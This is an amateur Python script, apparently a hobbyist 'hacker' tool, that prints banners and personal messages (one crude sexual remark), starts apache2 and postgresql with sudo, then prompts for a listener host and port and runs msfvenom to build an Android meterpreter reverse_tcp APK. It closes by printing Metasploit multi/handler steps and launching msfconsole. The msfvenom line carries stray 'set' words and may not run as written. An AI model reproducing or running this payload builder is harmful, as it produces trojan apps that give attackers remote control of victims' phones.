import os
import time
def root1():
    print("Be root ---enter your password : ")
    time.sleep(5)
    os.system("sudo")
root1()
a="""
                           -------------------
                           \                 /
                            \ HACKER-AZZIZ  /
                             \             /
                              -------------
                              fake ala-haji
"""
print(a)
n=10
for i in range (n):
     print(i,"I Love May")
b=("                          I'm Anonymous                            ")
print(b)
c=("I D'nt Know samthing about this but I'm so Horny :) ")
print(c)
print("""
                           ----May-----
                           ----My Love--
                          //////azziz/////
                         fake  lmojtama3 
                         kjksdjf d mofh fdsoh
""")
print("""
*****************************************************************************
++++++++++++++++++++++++++++++ Start service ++++++++++++++++++++++++++++++++
*****************************************************************************
""")


def apache2():
    print("[+]"+"starting apache2 server")
    time.sleep(2)
    os.system("sudo service apache2 start")
apache2()
def postgresql():
    print("[+]starting postgresql server")
    time.sleep(2)
    os.system("sudo service postgresql start")
postgresql()
def payload():
    #y=True
   # n=False
  #  pay1=str(input("Generate a payload android (y) or (n): "))
 #   while pay1=True:
#                   print("succes")
    #else :
        # print("false")
#    aa=str(input("Name of payload")
    host=str(input("enter LHOST="))
    lport=str(input("enter LPORT="))
    name=str(input("Name of app .apk : " ))
    print("[+]Generate a payload for android")
    time.sleep(15)
    os.system("msfvenom -p android/meterpreter/reverse_tcp set LHOST=%s set LPORT=%s -o %s " % (host, lport, name))
    print("[+]Payload saved in /home/azziz/Desktop/shadow/%s " % (name))
payload()
def Metasploit():
     lhost=str(input("enter 2éme HOST ="))
     lport=str(input("enter 2éme PORT="))
     print("Run this coomand on Metasploit :")
     print("[1] use exploit/multi/handler")
     print("[2] set payload android/meterpreter/reverse_tcp")
     print("[3] set LHOST %s " % (lhost))
     print("[4] set LPORT %s " % (lport))
     print("[5] exploit")
     print("[+]start Metasploit Framwork")
     time.sleep(20)
     os.system("msfconsole")
    # os.system("use exploit/multi/handler")
   #  os.system("set payload android/meterpreter/reverse_tcp")
  #   os.system("set LHOST %s " % (lhost))
 #    os.system("set LPORT %s " % (lport))
#     os.system("exploit")
Metasploit()
